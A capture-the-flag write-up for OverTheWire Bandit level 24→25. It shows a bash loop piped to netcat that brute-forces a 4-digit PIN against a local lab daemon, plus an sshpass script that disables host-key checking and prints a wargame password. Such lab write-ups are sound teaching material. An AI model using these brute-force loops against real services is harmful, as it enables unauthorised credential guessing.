🔢 Bandit Level 24 → 25

🎯 Objective

On this level, a daemon was listening on port 30002 and would give out the password for bandit25 only when given the correct combination: the current level's password and a secret 4‑digit PIN code.

The main goal was to learn how to apply a brute‑force method to find an unknown parameter and automate this process using scripts. 🔢

🔍 Solution Steps

Step 1: Connect to the daemon to understand the format:

	nc localhost 30002

The server expected input in the format: password PIN.

Step 2: Write a script to brute‑force all 4‑digit combinations (from 0000 to 9999):

	for i in {0000..9999}; do
		echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
	done | nc localhost 30002

Step 3: Analyse the output — among many error messages, there was one that contained the correct password.

Step 4: Obtain the password for the next level. 🎉

💻 Commands Used

	nc localhost 30002
	for i in {0000..9999}; do echo "password $i"; done | nc localhost 30002


🤖 Automation

#!/bin/bash

PASSWORD=$1
HOST="bandit.labs.overthewire.org"
PORT=2220
USER="bandit24"

CMD="
for PIN in {0000..9999}; do
    echo '$PASSWORD \$PIN'
done | nc localhost 30002 | grep -v 'Wrong'
"

echo "[*] Brute-forcing all PINs (this may take ~1 minute)..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $PORT $USER@$HOST "$CMD"


🧰 Tools Used

netcat (nc) — connecting to a network service. 🌐

bash — creating loops for brute‑forcing. 🔄

grep -v — filtering output. 🔍

{0000..9999} — generating a sequence of numbers. 🔢

📚 Skills Acquired

understanding the brute‑force method; 🔐

automating repetitive tasks using loops; ⚡

working with network services via netcat; 📡

filtering large volumes of output; 📊

creating effective scripts for cracking simple PIN codes. 🧠